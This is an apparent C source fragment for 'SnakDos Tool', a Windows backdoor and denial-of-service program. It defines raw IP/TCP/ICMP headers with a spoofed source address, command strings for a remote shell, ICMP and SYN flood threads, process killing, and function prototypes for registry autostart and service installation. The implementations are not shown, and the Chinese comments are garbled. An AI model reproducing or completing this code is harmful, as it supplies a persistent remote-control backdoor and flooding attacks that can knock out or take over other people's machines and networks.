#include <winsock2.h> 
#include <ws2tcpip.h> 
#include <stdio.h>
#include <stdlib.h>
#include "psapi.h"
#include "ClassXP.h"
#include "resource.h"
//#pragma comment(lib, "ws2_32.lib") 

#define false 0 
#define true 1 

#define SEQ 0x28376839 
#define CMD_HELP    0
#define CMD_ABOUT    1
#define CMD_EXITP    2
#define CMD_DOS     3
#define CMD_WIN     4
#define CMD_EXITT   5
#define CMD_MESG    6
#define CMD_PROCESS 7


#define FAKE_IP "11.11.11.11" //αװIP����ʼֵ���������αװIP����һ��B������ 

#define STATUS_FAILED 0xFFFF //���󷵻�ֵ 


typedef struct _iphdr //����IP�ײ� 

{ 

unsigned char h_verlen; //4λ�ײ�����,4λIP�汾�� 

unsigned char tos; //8λ��������TOS 

unsigned short total_len; //16λ�ܳ��ȣ��ֽڣ� 

unsigned short ident; //16λ��ʶ 

unsigned short frag_and_flags; //3λ��־λ 

unsigned char ttl; //8λ����ʱ�� TTL 

unsigned char proto; //8λЭ�� (TCP, UDP ������) 

unsigned short checksum; //16λIP�ײ�У��� 

unsigned int sourceIP; //32λԴIP��ַ 

unsigned int destIP; //32λĿ��IP��ַ 

}IP_HEADER; 


struct //����TCPα�ײ� 

{ 

unsigned long saddr; //Դ��ַ 

unsigned long daddr; //Ŀ�ĵ�ַ 

char mbz; 

char ptcl; //Э������ 

unsigned short tcpl; //TCP���� 

}psd_header; 


typedef struct _tcphdr //����TCP�ײ� 

{ 

USHORT th_sport; //16λԴ�˿� 

USHORT th_dport; //16λĿ�Ķ˿� 

unsigned int th_seq; //32λ���к� 

unsigned int th_ack; //32λȷ�Ϻ� 

unsigned char th_lenres; //4λ�ײ�����/6λ������ 

unsigned char th_flag; //6λ��־λ 

USHORT th_win; //16λ���ڴ�С 

USHORT th_sum; //16λУ��� 

USHORT th_urp; //16λ��������ƫ���� 

}TCP_HEADER; 


// ����ICMP�ײ� 
typedef struct _ihdr 
{ 
 BYTE i_type; //8λ���� 
 BYTE i_code; //8λ���� 
 USHORT i_cksum; //16λУ��� 
 USHORT i_id; //ʶ��� 
 USHORT i_seq; //�������к� 
 ULONG timestamp; //ʱ��� 
}ICMP_HEADER; 

char szCommand[][8] = 
{
    "HELP",
    "ABOUT",
    "EXITP",
	"DOS",
	"win",
	"EXITT",
	"MESG",
	"PROCESS"
};

// ��Ϣ�ַ���
char szByeT[] = "\r\nShell Thread Exit...\r\nGood luck. Bye-bye!\r\n";
char szICMPbye[] = "\r\nICMP Flood Thread Exit...\r\n";
char szExitT[] = "\r\nExit a Thread...\r\n[1]Shell Thread...\r\n[2]ICMP Flood Thread...\r\n";
char szByeP[] = "\r\nProcess Exit...\r\nGood luck. Bye-bye!\r\n";
char szHelp[] = "\r\nHELP\tHelp for command.\r\nABOUT\tAbout this server.\r\nExitP\tExit Process...\r\nDOS\tDOS Tool~\r\nWin\tA Windows Shell~\r\nExitT\tExit Thread...\r\nMesg\tSend Mesg..\r\nPROCESS\tProcess Relevant operation\r\n";
char szAbout[] = "\r\nSnakDos Tool, Ver 1.0\r\nby RattleSnak CVC/G.B\r\nMy home: http://bbs.logincom.com/bbs/cgi-bin/leoboard.cgi\r\n";
char szUnknown[] = "\r\nSorry, but I cound not understand your command.\r\n";
char szWelcome[] = "\r\nSnakDos Tool,Ver 1.0\r\nType HELP for help.\r\n";
char szDos[] ="\r\nThis is DOS Tool ~!\r\nIt is very dangerous\r\nHope to use prudently\r\n";
char szDosChoice[] ="\r\n[1] ICMP Flood...\t[ip] [Thread]\r\n[2] SYN Flood...\t[ip] [port] [Thread]\r\n";
char szWin[] = "\r\nA Windows Shell~!\r\nPress <Enter> to continue\r\n";
char szMesg[] = "\r\nSend Mesg...\r\n";
char szProRO[] = "\r\nProcess Relevant operation ~~\r\n\r\n[1] Show Process List...\r\n[2] Kill Process...\r\nPlease Input[1--2]:";
char szKillPro[] ="\r\nKill a Process...\r\nPlease Input a PID:"; 
HANDLE hThreadIcmp[1024];
HANDLE hThreadSyn[1024];
HANDLE hProcess;
PVOID pvParam;
DWORD dwThreadID;
char cip[20];
int port = 139;
char *argv[20];
int  help;
int  argc=0;
char *Cargv[20];

int  Cargc=0;
int  icmptnum;
SOCKET sListen;
SOCKET sAccept;
HINSTANCE shInstance;

int cs();
int Mesg();
int RegBoot();
int WinShell();
int DlgMain(HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow);
int DosChoice();
int ProcessRO();
int CmdIcmpDos();
int GetNetArgv();
int ExitThread();
int RegService();
int ProcessList();
int KillProcess();
int SynFloodChoice();
int IcmpFloodChoice();
int GetCmdArgv(PCHAR pCmdlin);
int ParamError(char ErrorCode[1024]);
DWORD WINAPI MesgThread(PVOID pwParam);
DWORD WINAPI TcpListenFun(PVOID pvParam);
DWORD WINAPI ThreadDosSend(PVOID pvParam);
DWORD WINAPI ThreadSynFlood(PVOID pvParam);
LRESULT CALLBACK WndProc (HWND, UINT, WPARAM, LPARAM);
int CALLBACK Dlg_Proc (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);
